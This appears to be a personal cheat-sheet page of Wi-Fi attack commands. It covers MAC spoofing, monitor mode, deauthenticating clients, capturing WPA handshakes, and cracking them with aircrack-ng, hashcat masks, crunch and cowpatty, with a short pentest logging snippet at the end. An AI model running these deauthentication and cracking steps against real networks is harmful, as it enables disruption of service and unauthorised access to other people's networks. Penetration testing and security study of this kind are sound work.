---
title: Hacking
date: 2020-04-03 20:32:13+01:00
author: Gaxpert
---

# Hacking


## Wifi

Wifi hacking
    
check wifi powers
`wavemon`
### macchanger
```
service network-manager stop
ifconfig wlan0 down
macchanger -b -a wlan0
ifconfig wlan0 up
service network-manager start
  ``` 
### airmon-ng
`airmon-ng check kill`
monitor mode
`airmon-ng start wlan0`
#### specify channel
`airmon-ng start wlan0 7`

#### Capture packets and write to file
`airodump-ng wlan0mon -w file.cap`
optional, target only one bssid
`--bssid AA:BB:CC: ....`
optional, deauth target
`aireplay-ng --deauth 100 -a AP -c CLIENT wlan0mon`

### handshakes
extract handshakes from file
`wpaclean handshakes.cap file.cap`
crack pass
`aircrack-ng handshakes.cap -w /path/to/dict.txt`
optional, use cruch as dic
 ` crunch 8 8 abcdefghijklmnopqrstuvwxyz aircrack-ng -b AA:BB:CC:DD -w - file.cap`
Or crack with hashcat (faster)


### hashcat
Stores result in ~/.hashcat/hashcat.pot

`cap2hccapx file.cap out.cap`
attention to several cap files
might need to specify network. Maybe check with "wpaclean" how many handshakes are present
`hashcat -a 0 -m 2500 all.hccapx rockyou.txt`

-a = Cracking mode
  0  = wordlist
  3  =  bruteforce
  1  = combinator

note: zsh doesnt like ? chat, use bash

charsets
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff

### Precompute PSK
`genpmk -f dict.txt -d hashes -s SSID`
ex: `genpmk -f rockyou.txt -d hashes -s TheLair`
then break with cowpatty
`cowpatty -d hashfile -r dumpfile -s ssid`


## Reporting

For pentesting, Add this to your .bashrc file:

PS1='[\`date  +"%d-%b-%y %T"\`] > ' 
test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/logs/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)

Now you can have a log of everything you did and when you did it.

## wHardware

ALFA Network AWUS036NHA + U-de Montage CS 5 dBi WiFi Adaptateur réseau

Plugable USB Bluetooth Adaptateur, 4.0 


